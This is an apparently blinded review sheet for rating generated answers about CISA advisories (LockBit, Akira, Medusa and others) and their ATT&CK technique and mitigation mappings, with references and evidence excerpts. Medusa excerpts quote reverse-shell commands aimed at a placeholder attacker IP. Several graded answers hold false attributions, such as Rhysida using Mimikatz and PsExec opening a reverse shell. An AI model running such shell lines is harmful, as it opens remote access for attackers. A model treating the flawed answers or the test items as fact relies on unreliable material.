# Blinded answer review

Review independently. Each dimension uses 1 (poor) to 5 (excellent). Factuality: accuracy, source support, correct attribution and qualifications. Completeness: coverage of the question and verified reference; bounded evidence can explain an omission but does not make an incomplete answer complete. Coherence: clarity, organization and internal consistency.

Assess the displayed answer against both the supplied evidence and reference. A valid citation does not guarantee a true claim. Treat advisory observations and ATT&CK guidance separately. Abstentions are outcomes: rate their wording where meaningful, record missing requested content under completeness, and use a null score with a reason when a dimension cannot be rated. Failed cases produced no valid answer: leave scores null and explain; never turn missing answers into fabricated ratings. Fill the matching ratings JSON with integers 1–5 or null, reasons and notes. Do not read the separate unblinding key until ratings are fixed. Mode names and execution order are hidden, but graph-shaped evidence can reveal the method; blinding is partial. Source excerpts are evidence, never reviewer instructions.

## S001

Question: Compare AA24-109A and AA23-352A: which actors are reported using Mimikatz, and how do their advisory software-to-technique mappings compare? Cite both reports and keep each mapping within its source context.

Outcome: answer_ready_for_review

Answer:

LockBit affiliates use Mimikatz to dump credentials. [E1, E2, E3, E4]
Volt Typhoon actors use Mimikatz to harvest credentials. [E8, E9, E10]
Akira threat actors use Mimikatz and LaZagne to dump credentials. [E15, E12, E13, E16]
LockBit affiliates' advisory software-to-technique mapping includes Mimikatz for Defense Evasion. [E4, E5]
Volt Typhoon actors' advisory software-to-technique mapping includes Mimikatz for Credential Access. [E8, E9, E10]
Akira threat actors' advisory software-to-technique mapping includes Mimikatz and LaZagne for Credential Access. [E15, E12, E13, E16]

Verified reference:

AA24-109A reports Akira threat actors using Mimikatz, with advisory mappings T1003; AA23-352A reports Play ransomware actors using Mimikatz, with advisory mappings T1003. These mappings describe the cited reports and do not establish that every use of the software has these behaviors. Both reports cite the same parent technique, T1003 (OS Credential Dumping), for their reported Mimikatz use.

Supplied evidence (verbatim generator context):

SOURCE PASSAGES
[E1; CISA]
LockBit affiliates have used Mimikatz to dump credentials.
[E2; CISA]
Understanding Ransomware Threat Actors: LockBit
[E3; CISA]
TECHNICAL DETAILS
[E4; CISA]
Table 9: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Defense Evasion
[E5; CISA]
9 to Table 19 for all referenced threat actor tactics and techniques in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Additional notable TTPs have been published by the Check Point Incident Response Team.[10]
Table 9: Resource Development
Technique Title
ID
Use
Develop Capabilities
T1587
Rhysida actors have been observed developing resources and custom tools, particularly with program names set to “Rhysida-0.1” to gain access to victim systems.
Table 10: Initial Access
Technique Title
ID
Use
Valid Accounts
T1078
Rhysida actors are known to use valid credentials to access internal VPN access points of victims.
Update April 30, 2025:
Table 11: Execution
Technique Title
ID
Use
Command and Scripting Interpreter: Cloud API
T1059.009
Rhysida actors leverage AZCopy, a command-line utility that 
[E6; CISA]
#StopRansomware: Rhysida Ransomware
[E7; CISA]
Technical Details
[E8; CISA]
The U.S. authoring agencies have observed Volt Typhoon actors leveraging Mimikatz to harvest credentials, and industry partners have observed Volt Typhoon leveraging Impacket.[2]
[E9; CISA]
PRC State-Sponsored Actors Compromise and Maintain Persistent Access to U.S. Critical Infrastructure
[E10; CISA]
TECHNICAL DETAILS
[E11; CISA]
002
Akira threat actors use the net group /domain command to find domain level groups and permission settings.
System Information Discovery
T1082
Akira threat actors use tools like PCHunter64 to acquire detailed process and system information.
Update Nov. 13, 2025
Akira threat actors use DiskCheck software to query remote systems for information on disk drives and installed software.
End Update
Update Nov. 13, 2025
Account Discovery: Domain Account
T1087.002
Akira threat actors use Adfind.exe to query and retrieve information from Active Directory.
End Update
Domain Trust Discovery
T1482
Akira threat actors use the net Windows command to enumerate domain information.
Update Nov. 13, 2025
Akira threat actors use nltest /DOMAIN_TRUSTS commands to enumerate domain trusts.
End Update
Table 17. Lateral Movement
Technique Title
ID
Use
Update Nov. 13, 2025
Remote Services

[E12; CISA]
#StopRansomware: Akira Ransomware
[E13; CISA]
Technical Details
[E14; CISA]
Table 15. Credential Access
[E15; CISA]
Akira threat actors use tools like Mimikatz and LaZagne to dump credentials.
[E16; CISA]
Table 14. Defense Evasion
GRAPH NODES
N1: LockBit affiliates
N2: Mimikatz (S0002)
N3: Volt Typhoon actors
N4: Akira threat actors
GRAPH PATHS
P1: N1 --USES[E1,E2,E3,E4]--> N2
P2: N3 --USES[E8,E9,E10]--> N2
P3: N4 --USES[E15,E12,E13,E16]--> N2

## S002

Question: According to AA25-071A, which ATT&CK technique is connected to Medusa actors through the reported use of PsExec? Explain the two-hop actor-to-software-to-technique path with evidence.

Outcome: answer_ready_for_review

Answer:

Medusa actors use PsExec to move laterally through the network. [E5, E6]
The ATT&CK technique connected to Medusa actors through the reported use of PsExec is T1569.002. [E5, E6]
The two-hop actor-to-software-to-technique path is: Medusa actors (N1) use PsExec (N2) to execute T1569.002. [E1, E2, E3, E5]

Verified reference:

Medusa actors use PsExec; the advisory associates the described use of PsExec with T1569.002 (Service Execution in Enterprise ATT&CK 17.1). Both links must be supported in the advisory context.

Supplied evidence (verbatim generator context):

SOURCE PASSAGES
[E1; CISA]
When provided with valid username and password credentials, Medusa actors use PsExec to:
[E2; CISA]
#StopRansomware: Medusa Ransomware
[E3; CISA]
Technical Details
[E4; CISA]

Note: This advisory uses the MITRE ATT&CK® Matrix for Enterprise framework, version 19. See the MITRE ATT&CK Tactics and Techniques section of this advisory for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques.
Background
(Updated Aug. 18, 2026) Since 2021, Medusa actors have used the Medusa variant to conduct ransomware attacks through at least April 2026. Medusa originally operated as a closed ransomware operation, meaning the same group of cyber threat actors controlled all development and associated ransomware campaigns. Since at least early 2023, Medusa progressed to using an affiliate model, selling RaaS to affiliates who are granted varying levels of trust based upon experience and profitability. For newer or less experienced affiliates, important operations such as ransom negotiation may be centrally controlled by the developers. Medusa actors use a double-extortion model where they encr
[E5; CISA]
-able, BeyondTrust, SimpleHelp, and Splashtop. Medusa actors use these tools—in combination with Remote Desktop Protocol (RDP) [T1021.001] and PsExec [T1569.002]—to move laterally [TA0008] through the network and identify files for exfiltration [TA0010] and encryption [T1486]. When provided with valid username and password credentials, Medusa actors use PsExec to:

[E6; CISA]
commands to create a reverse Transmission Control Protocol (TCP) connection to threat actor infrastructure:
bash -i >& /dev/tcp/<attacker IP>/4444 0>&1
bash -i >& /dev/tcp/<attacker IP>/443 0>&1
GSocket
Also known as Global Socket or gs-netcat.
Allows workstations on different private networks to connect and bypass firewalls.
Allows file transfers and command execution.
Lateral Movement, Credential Access, and Execution
(Updated Aug. 18, 2026) Medusa actors use a variety of legitimate remote monitoring and management (RMM) software [T1219]. To evade detection, they may tailor their choice based on remote access tools already present in the victim environment. 2,3 FBI identified Medusa actors using remote access software AnyDesk, Atera, ConnectWise, eHorus, N-able, BeyondTrust, SimpleHelp, and Splashtop. Medusa actors use these tools—in combination with Remote Desktop Protocol (RDP) [T1021.001] and Ps
GRAPH NODES
N1: Medusa actors
N2: PsExec (S0029)
GRAPH PATHS
P1: N1 --USES[E1,E2,E3]--> N2

## S003

Question: Which mitigation options have direct, active mitigates relationships in Enterprise ATT&CK 17.1 to the technique mapped to Advanced Internet Protocol (IP) Scanner in AA23-165A? Start from LockBit affiliates and follow the three-hop actor-to-software-to-technique-to-mitigation path. Distinguish advisory observations from reference recommendations.

Outcome: answer_ready_for_review

Answer:

LockBit affiliates' Advanced Port Scanner uses Network Service Discovery (T1046). [E5, E6, E7]
Network Segmentation (M1030) mitigates Network Service Discovery (T1046). [E8, E9]
AnyDesk enables Remote Access Tools (T1219). [E10, E6, E7]
Network Intrusion Prevention (M1031) mitigates Remote Access Tools (T1219). [E11, E12]
Backstab uses Disable or Modify Tools (T1562.001). [E14, E6, E7]
User Account Management (M1018) mitigates Disable or Modify Tools (T1562.001). [E15, E16]

Verified reference:

The AA23-165A Table 4 caption lists Advanced Internet Protocol (IP) Scanner as a tool used by LockBit affiliates. The selected advisory row maps its reported use to T1046 (Network Service Discovery). The direct, active mitigates relationships in Enterprise ATT&CK 17.1 connect this technique to: M1030 (Network Segmentation), M1031 (Network Intrusion Prevention), M1042 (Disable or Remove Feature or Program). These are reference mitigation associations, not incident-specific proof of effectiveness.

Supplied evidence (verbatim generator context):

SOURCE PASSAGES
[E1; CISA]
LockBit affiliates have used Mimikatz to dump credentials.
[E2; CISA]
Understanding Ransomware Threat Actors: LockBit
[E3; CISA]
TECHNICAL DETAILS
[E4; CISA]
Table 9: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Defense Evasion
[E5; CISA]
Advanced Port Scanner
Performs network scans.
Finds open Transmission Control Protocol (TCP) and User Data Protocol (UDP) ports for exploitation.
T1046
Network Service Discovery
[E6; CISA]
Table 4: Freeware and Open-Source Tools Used by LockBit Affiliates
[E7; CISA]
Tool
Intended Use
Repurposed Use by LockBit Affiliates
MITRE ATT&CK ID

[E8; ATTACK]
ATT&CK release: 17.1
Technique: Network Service Discovery (T1046)
Mitigation: Network Segmentation (M1030)
[E9; ATTACK]
Ensure proper network segmentation is followed to protect critical servers and devices.
[E10; CISA]
AnyDesk
Enables remote connections to network devices.
Enables remote control of victim’s network devices.
T1219
Remote Access Software
[E11; ATTACK]
ATT&CK release: 17.1
Technique: Remote Access Tools (T1219)
Mitigation: Network Intrusion Prevention (M1031)
[E12; ATTACK]
Network intrusion detection and prevention systems that use network signatures may be able to prevent traffic to remote access services.
[E13; CISA]
Atera Remote Monitoring & Management (RMM)
Enables remote connections to network devices.
Enables remote control of victim’s network devices.
T1219
Remote Access Software
[E14; CISA]
Backstab
Terminates antimalware-protected processes.
Terminates endpoint detection and response (EDR)- protected processes.
T1562.001
Impair Defenses: Disable or Modify Tools
[E15; ATTACK]
ATT&CK release: 17.1
Technique: Disable or Modify Tools (T1562.001)
Mitigation: User Account Management (M1018)
[E16; ATTACK]
Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services.
GRAPH NODES
N1: LockBit affiliates
N2: Mimikatz (S0002)
N3: Advanced Port Scanner
N4: Network Service Discovery (T1046)
N5: Network Segmentation (M1030)
N6: AnyDesk
N7: Remote Access Tools (T1219)
N8: Network Intrusion Prevention (M1031)
N9: Atera Remote Monitoring & Management (RMM)
N10: Backstab
N11: Disable or Modify Tools (T1562.001)
N12: User Account Management (M1018)
GRAPH PATHS
P1: N1 --USES[E1,E2,E3,E4]--> N2
P2: N1 --USES[E5,E6,E7]--> N3 --USES_TECHNIQUE[E5,E6,E7]--> N4 --MITIGATED_BY[E8,E9]--> N5
P3: N1 --USES[E10,E6,E7]--> N6 --USES_TECHNIQUE[E10,E6,E7]--> N7 --MITIGATED_BY[E11,E12]--> N8
P4: N1 --USES[E13,E6,E7]--> N9 --USES_TECHNIQUE[E13,E6,E7]--> N7 --MITIGATED_BY[E11,E12]--> N8
P5: N1 --USES[E14,E6,E7]--> N10 --USES_TECHNIQUE[E14,E6,E7]--> N11 --MITIGATED_BY[E15,E16]--> N12

## S004

Question: What is the two-hop relationship from LockBit affiliates through Advanced Internet Protocol (IP) Scanner to an ATT&CK technique in this advisory? Explain both the software-use link and the technique mapping.

Outcome: answer_ready_for_review

Answer:

LockBit affiliates use Advanced Port Scanner to scan target networks. [E10, E11, E12, E13]
Advanced Port Scanner performs network scans, finding open TCP and UDP ports for exploitation. [E1, E2, E3]
Network Service Discovery (T1046) is the ATT&CK technique used by LockBit affiliates. [E4, E5]
Network Segmentation (M1030) is the mitigation for Network Service Discovery (T1046). [E4, E5]
Network Segmentation (M1030) involves ensuring proper network segmentation to protect critical servers and devices. [E4, E5]

Verified reference:

The advisory lists Advanced Internet Protocol (IP) Scanner among tools used by LockBit affiliates and associates its repurposed use with T1046 (Network Service Discovery in the frozen Enterprise ATT&CK 17.1 reference). This describes the advisory mapping, not all uses of that tool.

Supplied evidence (verbatim generator context):

SOURCE PASSAGES
[E1; CISA]
Advanced Port Scanner
Performs network scans.
Finds open Transmission Control Protocol (TCP) and User Data Protocol (UDP) ports for exploitation.
T1046
Network Service Discovery
[E2; CISA]
Table 4: Freeware and Open-Source Tools Used by LockBit Affiliates
[E3; CISA]
Tool
Intended Use
Repurposed Use by LockBit Affiliates
MITRE ATT&CK ID

[E4; ATTACK]
ATT&CK release: 17.1
Technique: Network Service Discovery (T1046)
Mitigation: Network Segmentation (M1030)
[E5; ATTACK]
Ensure proper network segmentation is followed to protect critical servers and devices.
[E6; CISA]
AnyDesk
Enables remote connections to network devices.
Enables remote control of victim’s network devices.
T1219
Remote Access Software
[E7; ATTACK]
ATT&CK release: 17.1
Technique: Remote Access Tools (T1219)
Mitigation: Network Intrusion Prevention (M1031)
[E8; ATTACK]
Network intrusion detection and prevention systems that use network signatures may be able to prevent traffic to remote access services.
[E9; CISA]
Atera Remote Monitoring & Management (RMM)
Enables remote connections to network devices.
Enables remote control of victim’s network devices.
T1219
Remote Access Software
[E10; CISA]
LockBit affiliates use SoftPerfect Network Scanner, Advanced IP Scanner, or Advanced Port Scanner to scan target networks.
[E11; CISA]
Understanding Ransomware Threat Actors: LockBit
[E12; CISA]
TECHNICAL DETAILS
[E13; CISA]
Table 11: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Discovery
[E14; CISA]

ID
Use
Network Service Discovery
T1046
LockBit affiliates use SoftPerfect Network Scanner, Advanced IP Scanner, or Advanced Port Scanner to scan target networks.
LockBit affiliates may use SoftPerfect Network Scanner, Advanced Port Scanner, and AdFind to enumerate connected machines in the network.
System Information Discovery
T1082
LockBit affiliates will enumerate system information to include hostname, host configuration, domain information, local drive configuration, remote shares, and mounted external storage devices.
System Location Discovery: System Language Discovery
T1614.001
LockBit 3.0 will not infect machines with language settings that match a defined exclusion list.
Table 12: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Lateral Movement
Technique Title
ID
Use
Lateral Movement
TA0008
LockBit affiliates will laterally move 
GRAPH NODES
N1: LockBit affiliates
N2: Advanced Port Scanner
N3: Network Service Discovery (T1046)
N4: Network Segmentation (M1030)
N5: AnyDesk
N6: Remote Access Tools (T1219)
N7: Network Intrusion Prevention (M1031)
N8: Atera Remote Monitoring & Management (RMM)
N9: SoftPerfect Network Scanner
GRAPH PATHS
P1: N1 --USES[E1,E2,E3]--> N2 --USES_TECHNIQUE[E1,E2,E3]--> N3 --MITIGATED_BY[E4,E5]--> N4
P2: N1 --USES[E6,E2,E3]--> N5 --USES_TECHNIQUE[E6,E2,E3]--> N6 --MITIGATED_BY[E7,E8]--> N7
P3: N1 --USES[E9,E2,E3]--> N8 --USES_TECHNIQUE[E9,E2,E3]--> N6 --MITIGATED_BY[E7,E8]--> N7
P4: N1 --USES[E10,E11,E12,E13]--> N9

## S005

Question: Compare AA24-109A and AA23-352A: which actors are reported using Mimikatz, and how do their advisory software-to-technique mappings compare? Cite both reports and keep each mapping within its source context.

Outcome: answer_ready_for_review

Answer:

LockBit affiliates use Mimikatz to dump credentials. [E1, E2, E3, E4]
Volt Typhoon actors use Mimikatz to harvest credentials. [E8, E9, E10]
Akira threat actors use Mimikatz to dump credentials. [E15, E12, E13, E16]
LockBit affiliates' advisory software-to-technique mappings include Mimikatz (S0002) for Defense Evasion. [E4]
Volt Typhoon actors' advisory software-to-technique mappings include Mimikatz for Credential Access. [E8, E9, E10]
Akira threat actors' advisory software-to-technique mappings include Mimikatz for Credential Access. [E15, E12, E13, E16]

Verified reference:

AA24-109A reports Akira threat actors using Mimikatz, with advisory mappings T1003; AA23-352A reports Play ransomware actors using Mimikatz, with advisory mappings T1003. These mappings describe the cited reports and do not establish that every use of the software has these behaviors. Both reports cite the same parent technique, T1003 (OS Credential Dumping), for their reported Mimikatz use.

Supplied evidence (verbatim generator context):

SOURCE PASSAGES
[E1; CISA]
LockBit affiliates have used Mimikatz to dump credentials.
[E2; CISA]
Understanding Ransomware Threat Actors: LockBit
[E3; CISA]
TECHNICAL DETAILS
[E4; CISA]
Table 9: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Defense Evasion
[E5; CISA]
9 to Table 19 for all referenced threat actor tactics and techniques in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Additional notable TTPs have been published by the Check Point Incident Response Team.[10]
Table 9: Resource Development
Technique Title
ID
Use
Develop Capabilities
T1587
Rhysida actors have been observed developing resources and custom tools, particularly with program names set to “Rhysida-0.1” to gain access to victim systems.
Table 10: Initial Access
Technique Title
ID
Use
Valid Accounts
T1078
Rhysida actors are known to use valid credentials to access internal VPN access points of victims.
Update April 30, 2025:
Table 11: Execution
Technique Title
ID
Use
Command and Scripting Interpreter: Cloud API
T1059.009
Rhysida actors leverage AZCopy, a command-line utility that 
[E6; CISA]
#StopRansomware: Rhysida Ransomware
[E7; CISA]
Technical Details
[E8; CISA]
The U.S. authoring agencies have observed Volt Typhoon actors leveraging Mimikatz to harvest credentials, and industry partners have observed Volt Typhoon leveraging Impacket.[2]
[E9; CISA]
PRC State-Sponsored Actors Compromise and Maintain Persistent Access to U.S. Critical Infrastructure
[E10; CISA]
TECHNICAL DETAILS
[E11; CISA]
002
Akira threat actors use the net group /domain command to find domain level groups and permission settings.
System Information Discovery
T1082
Akira threat actors use tools like PCHunter64 to acquire detailed process and system information.
Update Nov. 13, 2025
Akira threat actors use DiskCheck software to query remote systems for information on disk drives and installed software.
End Update
Update Nov. 13, 2025
Account Discovery: Domain Account
T1087.002
Akira threat actors use Adfind.exe to query and retrieve information from Active Directory.
End Update
Domain Trust Discovery
T1482
Akira threat actors use the net Windows command to enumerate domain information.
Update Nov. 13, 2025
Akira threat actors use nltest /DOMAIN_TRUSTS commands to enumerate domain trusts.
End Update
Table 17. Lateral Movement
Technique Title
ID
Use
Update Nov. 13, 2025
Remote Services

[E12; CISA]
#StopRansomware: Akira Ransomware
[E13; CISA]
Technical Details
[E14; CISA]
Table 15. Credential Access
[E15; CISA]
Akira threat actors use tools like Mimikatz and LaZagne to dump credentials.
[E16; CISA]
Table 14. Defense Evasion
GRAPH NODES
N1: LockBit affiliates
N2: Mimikatz (S0002)
N3: Volt Typhoon actors
N4: Akira threat actors
GRAPH PATHS
P1: N1 --USES[E1,E2,E3,E4]--> N2
P2: N3 --USES[E8,E9,E10]--> N2
P3: N4 --USES[E15,E12,E13,E16]--> N2

## S006

Question: Compare AA24-109A and AA23-352A: which actors are reported using Mimikatz, and how do their advisory software-to-technique mappings compare? Cite both reports and keep each mapping within its source context.

Outcome: answer_ready_for_review

Answer:

Rhysida actors use Mimikatz to gain access to victim systems. [E1, E2]
Akira threat actors use Mimikatz to query remote systems for information on disk drives and installed software. [E3, E4]
CISA maps Rhysida's use of AZCopy to T1059.009 Command and Scripting Interpreter: Cloud API. [E1, E5]
CISA maps Akira's use of net group /domain command to T1082 System Information Discovery. [E3, E4]
CISA maps Akira's use of PCHunter64 to T1082 System Information Discovery. [E3, E4]
CISA maps Akira's use of DiskCheck software to T1082 System Information Discovery. [E3, E4]
CISA maps Akira's use of Adfind.exe to T1087.002 Account Discovery: Domain Account. [E3, E4]
CISA maps Akira's use of net Windows command to T1482 Domain Trust Discovery. [E3, E4]

Verified reference:

AA24-109A reports Akira threat actors using Mimikatz, with advisory mappings T1003; AA23-352A reports Play ransomware actors using Mimikatz, with advisory mappings T1003. These mappings describe the cited reports and do not establish that every use of the software has these behaviors. Both reports cite the same parent technique, T1003 (OS Credential Dumping), for their reported Mimikatz use.

Supplied evidence (verbatim generator context):

SOURCE PASSAGES
[E1; CISA]
9 to Table 19 for all referenced threat actor tactics and techniques in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Additional notable TTPs have been published by the Check Point Incident Response Team.[10]
Table 9: Resource Development
Technique Title
ID
Use
Develop Capabilities
T1587
Rhysida actors have been observed developing resources and custom tools, particularly with program names set to “Rhysida-0.1” to gain access to victim systems.
Table 10: Initial Access
Technique Title
ID
Use
Valid Accounts
T1078
Rhysida actors are known to use valid credentials to access internal VPN access points of victims.
Update April 30, 2025:
Table 11: Execution
Technique Title
ID
Use
Command and Scripting Interpreter: Cloud API
T1059.009
Rhysida actors leverage AZCopy, a command-line utility that 
[E2; CISA]
#StopRansomware: Rhysida Ransomware
[E3; CISA]
Technical Details
[E4; CISA]
002
Akira threat actors use the net group /domain command to find domain level groups and permission settings.
System Information Discovery
T1082
Akira threat actors use tools like PCHunter64 to acquire detailed process and system information.
Update Nov. 13, 2025
Akira threat actors use DiskCheck software to query remote systems for information on disk drives and installed software.
End Update
Update Nov. 13, 2025
Account Discovery: Domain Account
T1087.002
Akira threat actors use Adfind.exe to query and retrieve information from Active Directory.
End Update
Domain Trust Discovery
T1482
Akira threat actors use the net Windows command to enumerate domain information.
Update Nov. 13, 2025
Akira threat actors use nltest /DOMAIN_TRUSTS commands to enumerate domain trusts.
End Update
Table 17. Lateral Movement
Technique Title
ID
Use
Update Nov. 13, 2025
Remote Services

[E5; CISA]
#StopRansomware: Akira Ransomware
[E6; CISA]
Technical Details
[E7; CISA]
Table 15. Credential Access
GRAPH NODES
GRAPH PATHS

## S007

Question: Which mitigation options have direct, active mitigates relationships in Enterprise ATT&CK 17.1 to the technique mapped to Advanced Internet Protocol (IP) Scanner in AA23-165A? Start from LockBit affiliates and follow the three-hop actor-to-software-to-technique-to-mitigation path. Distinguish advisory observations from reference recommendations.

Outcome: answer_ready_for_review

Answer:

LockBit affiliates' activity may be mitigated by disabling or removing unnecessary ports and services. [E6, E5]
LockBit affiliates' activity may be mitigated by using network intrusion prevention systems that use network signatures. [E8, E9, E7]
Network Intrusion Prevention (M1031) may mitigate Network Service Discovery (T1046) and Remote Access Tools (T1219) and Exfiltration Over Alternative Protocol (T1048). [E2, E6, E8, E10]
Disable or Remove Feature or Program (M1042) may mitigate Network Service Discovery (T1046). [E6, E2]

Verified reference:

The AA23-165A Table 4 caption lists Advanced Internet Protocol (IP) Scanner as a tool used by LockBit affiliates. The selected advisory row maps its reported use to T1046 (Network Service Discovery). The direct, active mitigates relationships in Enterprise ATT&CK 17.1 connect this technique to: M1030 (Network Segmentation), M1031 (Network Intrusion Prevention), M1042 (Disable or Remove Feature or Program). These are reference mitigation associations, not incident-specific proof of effectiveness.

Supplied evidence (verbatim generator context):

SOURCE PASSAGES
[E1; ATTACK]
Use network intrusion detection/prevention systems to detect and prevent remote service scans.
[E2; ATTACK]
ATT&CK release: 17.1
Technique: Network Service Discovery (T1046)
Mitigation: Network Intrusion Prevention (M1031)
[E3; ATTACK]
This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls.
[E4; ATTACK]
ATT&CK release: 17.1
Technique: Develop Capabilities (T1587)
Mitigation: Pre-compromise (M1056)
[E5; ATTACK]
Ensure that unnecessary ports and services are closed to prevent risk of discovery and potential exploitation.
[E6; ATTACK]
ATT&CK release: 17.1
Technique: Network Service Discovery (T1046)
Mitigation: Disable or Remove Feature or Program (M1042)
[E7; ATTACK]
Network intrusion detection and prevention systems that use network signatures may be able to prevent traffic to remote access services.
[E8; ATTACK]
ATT&CK release: 17.1
Technique: Remote Access Tools (T1219)
Mitigation: Network Intrusion Prevention (M1031)
[E9; ATTACK]
Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level.
[E10; ATTACK]
ATT&CK release: 17.1
Technique: Exfiltration Over Alternative Protocol (T1048)
Mitigation: Network Intrusion Prevention (M1031)
GRAPH NODES
GRAPH PATHS

## S008

Question: According to AA25-071A, which ATT&CK technique is connected to Medusa actors through the reported use of PsExec? Explain the two-hop actor-to-software-to-technique path with evidence.

Outcome: answer_ready_for_review

Answer:

Medusa actors use PsExec to move laterally through the network. [E5, E6]
The ATT&CK technique connected to Medusa actors through the reported use of PsExec is T1569.002. [E5, E6]
The two-hop actor-to-software-to-technique path is: Medusa actors (N1) use PsExec (N2), which is connected to T1569.002. [E1, E2, E3, E5]

Verified reference:

Medusa actors use PsExec; the advisory associates the described use of PsExec with T1569.002 (Service Execution in Enterprise ATT&CK 17.1). Both links must be supported in the advisory context.

Supplied evidence (verbatim generator context):

SOURCE PASSAGES
[E1; CISA]
When provided with valid username and password credentials, Medusa actors use PsExec to:
[E2; CISA]
#StopRansomware: Medusa Ransomware
[E3; CISA]
Technical Details
[E4; CISA]

Note: This advisory uses the MITRE ATT&CK® Matrix for Enterprise framework, version 19. See the MITRE ATT&CK Tactics and Techniques section of this advisory for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques.
Background
(Updated Aug. 18, 2026) Since 2021, Medusa actors have used the Medusa variant to conduct ransomware attacks through at least April 2026. Medusa originally operated as a closed ransomware operation, meaning the same group of cyber threat actors controlled all development and associated ransomware campaigns. Since at least early 2023, Medusa progressed to using an affiliate model, selling RaaS to affiliates who are granted varying levels of trust based upon experience and profitability. For newer or less experienced affiliates, important operations such as ransom negotiation may be centrally controlled by the developers. Medusa actors use a double-extortion model where they encr
[E5; CISA]
-able, BeyondTrust, SimpleHelp, and Splashtop. Medusa actors use these tools—in combination with Remote Desktop Protocol (RDP) [T1021.001] and PsExec [T1569.002]—to move laterally [TA0008] through the network and identify files for exfiltration [TA0010] and encryption [T1486]. When provided with valid username and password credentials, Medusa actors use PsExec to:

[E6; CISA]
commands to create a reverse Transmission Control Protocol (TCP) connection to threat actor infrastructure:
bash -i >& /dev/tcp/<attacker IP>/4444 0>&1
bash -i >& /dev/tcp/<attacker IP>/443 0>&1
GSocket
Also known as Global Socket or gs-netcat.
Allows workstations on different private networks to connect and bypass firewalls.
Allows file transfers and command execution.
Lateral Movement, Credential Access, and Execution
(Updated Aug. 18, 2026) Medusa actors use a variety of legitimate remote monitoring and management (RMM) software [T1219]. To evade detection, they may tailor their choice based on remote access tools already present in the victim environment. 2,3 FBI identified Medusa actors using remote access software AnyDesk, Atera, ConnectWise, eHorus, N-able, BeyondTrust, SimpleHelp, and Splashtop. Medusa actors use these tools—in combination with Remote Desktop Protocol (RDP) [T1021.001] and Ps
GRAPH NODES
N1: Medusa actors
N2: PsExec (S0029)
GRAPH PATHS
P1: N1 --USES[E1,E2,E3]--> N2

## S009

Question: According to AA25-071A, which ATT&CK technique is connected to Medusa actors through the reported use of PsExec? Explain the two-hop actor-to-software-to-technique path with evidence.

Outcome: answer_ready_for_review

Answer:

Medusa actors use PsExec to move laterally through the network. [E4, E5]
Medusa actors use PsExec to create a reverse TCP connection to threat actor infrastructure. [E5]
The ATT&CK technique connected to Medusa actors through the reported use of PsExec is T1569.002. [E4, E5]
The two-hop actor-to-software-to-technique path is: Medusa actors -> PsExec -> T1569.002. [E4, E5]

Verified reference:

Medusa actors use PsExec; the advisory associates the described use of PsExec with T1569.002 (Service Execution in Enterprise ATT&CK 17.1). Both links must be supported in the advisory context.

Supplied evidence (verbatim generator context):

SOURCE PASSAGES
[E1; CISA]

Note: This advisory uses the MITRE ATT&CK® Matrix for Enterprise framework, version 19. See the MITRE ATT&CK Tactics and Techniques section of this advisory for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques.
Background
(Updated Aug. 18, 2026) Since 2021, Medusa actors have used the Medusa variant to conduct ransomware attacks through at least April 2026. Medusa originally operated as a closed ransomware operation, meaning the same group of cyber threat actors controlled all development and associated ransomware campaigns. Since at least early 2023, Medusa progressed to using an affiliate model, selling RaaS to affiliates who are granted varying levels of trust based upon experience and profitability. For newer or less experienced affiliates, important operations such as ransom negotiation may be centrally controlled by the developers. Medusa actors use a double-extortion model where they encr
[E2; CISA]
#StopRansomware: Medusa Ransomware
[E3; CISA]
Technical Details
[E4; CISA]
-able, BeyondTrust, SimpleHelp, and Splashtop. Medusa actors use these tools—in combination with Remote Desktop Protocol (RDP) [T1021.001] and PsExec [T1569.002]—to move laterally [TA0008] through the network and identify files for exfiltration [TA0010] and encryption [T1486]. When provided with valid username and password credentials, Medusa actors use PsExec to:

[E5; CISA]
commands to create a reverse Transmission Control Protocol (TCP) connection to threat actor infrastructure:
bash -i >& /dev/tcp/<attacker IP>/4444 0>&1
bash -i >& /dev/tcp/<attacker IP>/443 0>&1
GSocket
Also known as Global Socket or gs-netcat.
Allows workstations on different private networks to connect and bypass firewalls.
Allows file transfers and command execution.
Lateral Movement, Credential Access, and Execution
(Updated Aug. 18, 2026) Medusa actors use a variety of legitimate remote monitoring and management (RMM) software [T1219]. To evade detection, they may tailor their choice based on remote access tools already present in the victim environment. 2,3 FBI identified Medusa actors using remote access software AnyDesk, Atera, ConnectWise, eHorus, N-able, BeyondTrust, SimpleHelp, and Splashtop. Medusa actors use these tools—in combination with Remote Desktop Protocol (RDP) [T1021.001] and Ps
GRAPH NODES
GRAPH PATHS

## S010

Question: What is the two-hop relationship from LockBit affiliates through Advanced Internet Protocol (IP) Scanner to an ATT&CK technique in this advisory? Explain both the software-use link and the technique mapping.

Outcome: answer_ready_for_review

Answer:

LockBit affiliates use Advanced IP Scanner to perform network scans. [E2, E1]
Advanced IP Scanner is used for Network Service Discovery (T1046). [E2, E1, E8]
LockBit affiliates may use Advanced Port Scanner to enumerate connected machines in the network. [E2, E1]
Network Service Discovery (T1046) is used by LockBit affiliates. [E2, E8]
Network Intrusion Prevention (M1031) can detect and prevent remote service scans. [E10, E11]

Verified reference:

The advisory lists Advanced Internet Protocol (IP) Scanner among tools used by LockBit affiliates and associates its repurposed use with T1046 (Network Service Discovery in the frozen Enterprise ATT&CK 17.1 reference). This describes the advisory mapping, not all uses of that tool.

Supplied evidence (verbatim generator context):

SOURCE PASSAGES
[E1; CISA]
Advanced Port Scanner
Performs network scans.
